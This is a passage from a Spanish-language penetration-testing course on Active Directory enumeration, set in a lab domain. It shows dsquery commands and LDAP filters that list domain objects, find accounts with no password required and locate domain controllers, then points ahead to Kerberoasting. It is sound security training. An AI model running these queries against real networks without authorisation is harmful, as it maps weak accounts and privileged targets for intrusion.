"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
```

Podemos usar una [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)) para ver todos los objetos en una OU, por ejemplo.

### Wildcard Search

```r
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

<SNIP>
```

Por supuesto, podemos combinar `dsquery` con filtros de búsqueda LDAP de nuestra elección. A continuación se muestra una búsqueda de usuarios con la flag `PASSWD_NOTREQD` establecida en el atributo `userAccountControl`.

### Users With Specific Attributes Set (PASSWD_NOTREQD)

```r
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```

El siguiente filtro de búsqueda busca todos los Controladores de Dominio en el dominio actual, limitando a cinco resultados.

### Searching for Domain Controllers

```r
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

### LDAP Filtering Explained

Notarás en las consultas anteriores que estamos usando strings como `userAccountControl:1.2.840.113556.1.4.803:=8192`. Estos strings son consultas LDAP comunes que se pueden usar con varias herramientas diferentes también, incluyendo AD PowerShell, ldapsearch, y muchas otras. Vamos a desglosarlas rápidamente:

`userAccountControl:1.2.840.113556.1.4.803:` especifica que estamos buscando los atributos de [User Account Control (UAC)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) para un objeto. Esta parte puede cambiar para incluir tres valores diferentes que explicaremos a continuación cuando busquemos información en AD (también conocido como [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/)).  
`=8192` representa la máscara de bits decimal que queremos que coincida en esta búsqueda. Este número decimal corresponde a una flag de atributo UAC correspondiente que determina si se establece un atributo como `password is not required` o `account is locked`. Estos valores pueden componerse y hacer múltiples entradas de bits diferentes. A continuación se muestra una lista rápida de valores potenciales.

### UAC Values

![text](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

### OID match strings

Los OIDs son reglas utilizadas para hacer coincidir valores de bits con atributos, como se ve arriba. Para LDAP y AD, hay tres reglas principales de coincidencia:

1. `1.2.840.113556.1.4.803`

Cuando usamos esta regla como lo hicimos en el ejemplo anterior, estamos diciendo que el valor del bit debe coincidir completamente para cumplir con los requisitos de búsqueda. Excelente para coincidir con un atributo singular.

2. `1.2.840.113556.1.4.804`

Cuando usamos esta regla, estamos diciendo que queremos que nuestros resultados muestren cualquier coincidencia de atributo si cualquier bit en la cadena coincide. Esto funciona en el caso de que un objeto tenga múltiples atributos establecidos.

3. `1.2.840.113556.1.4.1941`

Esta regla se utiliza para filtrar búsquedas que se aplican al Distinguished Name de un objeto y buscará a través de todas las entradas de propiedad y membresía.

### Logical Operators

Al construir strings de búsqueda, podemos utilizar operadores lógicos para combinar valores para la búsqueda. Los operadores `&` `|` y `!` se usan para este propósito. Por ejemplo, podemos combinar múltiples [criterios de búsqueda](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) con el operador `& (and)` así:  
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

El ejemplo anterior establece el primer criterio de que el objeto debe ser un usuario y lo combina con la búsqueda de un valor de bit UAC de 64 (Password Can't Change). Un usuario con ese atributo establecido coincidiría con el filtro. Puedes llevar esto aún más lejos y combinar múltiples atributos como `(&(1) (2) (3))`. Los operadores `!` (not) y `|` (or) pueden funcionar de manera similar. Por ejemplo, nuestro filtro anterior puede modificarse de la siguiente manera:  
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

Esto buscaría cualquier objeto de usuario que no tenga el atributo Password Can't Change establecido. Al pensar en usuarios, grupos y otros objetos en AD, nuestra capacidad de búsqueda con consultas LDAP es bastante extensa.

Se puede hacer mucho con filtros UAC, operadores y coincidencias de atributos con reglas OID. Por ahora, esta explicación general debería ser suficiente para cubrir este módulo. Para obtener más información y una inmersión más profunda en el uso de este tipo de búsqueda de filtros, consulte el módulo [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap).

---

Ahora hemos utilizado nuestro punto de apoyo para realizar la enumeración con credenciales con herramientas en hosts de ataque Linux y Windows y utilizando herramientas integradas y validado la información de host y dominio. Hemos demostrado que podemos acceder a hosts internos, el password spraying y el envenenamiento LLMNR/NBT-NS funcionan y que podemos utilizar herramientas que ya residen en los hosts para realizar nuestras acciones. Ahora llevaremos esto un paso más allá y abordaremos una TTP que todo pentester de AD debería tener en su arsenal, `Kerberoasting`.